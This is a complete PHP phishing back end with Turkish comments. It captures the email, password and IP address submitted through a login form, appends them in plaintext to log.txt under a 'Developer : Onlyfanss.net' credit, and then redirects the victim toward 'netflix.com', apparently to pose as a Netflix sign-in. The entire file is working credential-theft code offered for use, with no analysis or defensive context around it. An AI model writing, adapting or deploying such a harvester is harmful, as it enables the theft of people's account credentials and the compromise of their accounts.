<?php
// IP adresini alma
$ip_address = $_SERVER['REMOTE_ADDR'];

// Formdan gelen kullanıcı adı ve şifre bilgilerini al
$username = isset($_POST['email']) ? $_POST['email'] : 'Bilinmiyor';
$password = isset($_POST['password']) ? $_POST['password'] : 'Bilinmiyor';

// Tarihi al
$date = date("d.m.Y H:i:s");

// Log dosyasına yazılacak içerik
$log_content = "Tarih : " . $date . "\n";
$log_content .= "Kullanıcı Adı : " . $username . "\n";
$log_content .= "Şifre : " . $password . "\n";
$log_content .= "İp Adresi : " . $ip_address . "\n";
$log_content .= "Developer : Onlyfanss.net\n";
$log_content .= "------------------------\n";

// Log.txt dosyasına ekleme modu ile yaz
file_put_contents("log.txt", $log_content, FILE_APPEND);

// Giriş işlemi sonrasında yapılacak diğer işlemler buraya eklenebilir
// Örneğin: yönlendirme yapabilir veya mesaj gösterebilirsin.
header("Location: netflix.com"); // Girişten sonra ana sayfaya yönlendirme
exit();
?>
